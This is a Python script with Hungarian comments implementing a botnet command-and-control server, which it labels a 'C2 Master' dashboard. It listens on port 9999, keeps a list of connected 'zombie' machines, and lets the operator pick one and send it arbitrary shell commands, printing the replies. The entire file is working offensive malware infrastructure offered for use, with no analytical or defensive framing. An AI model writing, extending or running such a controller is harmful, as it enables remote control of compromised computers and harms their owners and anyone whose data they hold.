import socket
import threading
import time
import os

# Globális lista a zombik tárolására
ZOMBIES = {} # {id: (socket, address)}

def handle_zombie(conn, addr, z_id):
    """Ez a szál tartja a kapcsolatot egy darab zombival."""
    print(f"\n[+] ÚJ ZOMBI CSATLAKOZOTT: ID #{z_id} ({addr[0]})")
    try:
        while True:
            # Csak életben tartjuk a kapcsolatot (Heartbeat), vagy parancsot várunk
            # Ebben az egyszerű verzióban a főszál fogja küldeni a parancsot
            time.sleep(1)
    except:
        print(f"\n[-] Zombi #{z_id} lecsatlakozott.")
        if z_id in ZOMBIES:
            del ZOMBIES[z_id]

def listener_thread():
    """A háttérben figyeli az új kapcsolatokat."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 9999))
    server.listen(5)
    
    zombie_id = 1
    while True:
        conn, addr = server.accept()
        ZOMBIES[zombie_id] = (conn, addr)
        # Külön szál minden zombinak
        t = threading.Thread(target=handle_zombie, args=(conn, addr, zombie_id))
        t.daemon = True
        t.start()
        zombie_id += 1

def main_dashboard():
    os.system("cls")
    print("""
    ██████╗ ██████╗     ███╗   ███╗███████╗███╗   ██╗██╗   ██╗
    ██╔════╝╚════██╗    ████╗ ████║██╔════╝████╗  ██║██║   ██║
    ██║      █████╔╝    ██╔████╔██║█████╗  ██╔██╗ ██║██║   ██║
    ██║      ██╔══╝     ██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║   ██║
    ╚██████╗███████╗    ██║ ╚═╝ ██║███████╗██║ ╚████║╚██████╔╝
     ╚═════╝╚══════╝    ╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ 
        --- COMMAND & CONTROL DASHBOARD v1.0 ---
    """)
    
    # Háttérben indítjuk a szervert
    t = threading.Thread(target=listener_thread)
    t.daemon = True
    t.start()
    
    print("[*] Szerver fut a 9999-es porton. Várakozás...")
    
    while True:
        cmd = input("\nC2_Master > ").strip().lower()
        
        if cmd == "list":
            print("\n--- AKTÍV ZOMBIK ---")
            for z_id, data in ZOMBIES.items():
                print(f"ID: {z_id} | IP: {data[1][0]} | Port: {data[1][1]}")
            print("--------------------")
            
        elif cmd.startswith("use"):
            try:
                # use 1 -> kiválasztja az 1-es zombit
                target_id = int(cmd.split()[1])
                if target_id in ZOMBIES:
                    conn = ZOMBIES[target_id][0]
                    print(f"[*] Belépés a Zombi #{target_id} termináljába...")
                    while True:
                        shell_cmd = input(f"Zombi_{target_id} > ")
                        if shell_cmd == "back": break
                        if shell_cmd == "": continue
                        
                        # Parancs küldése
                        try:
                            conn.send(shell_cmd.encode())
                            # Válasz fogadása (egyszerűsítve)
                            response = conn.recv(4096).decode(errors='ignore')
                            print(response)
                        except:
                            print("[-] Hiba a kommunikációban.")
                            break
                else:
                    print("[-] Nincs ilyen ID.")
            except:
                print("[-] Használat: use <id>")

        elif cmd == "help":
            print("Parancsok: list, use <id>, exit")
            
        elif cmd == "exit":
            print("Viszlát, Master.")
            os._exit(0)

if __name__ == "__main__":
    main_dashboard()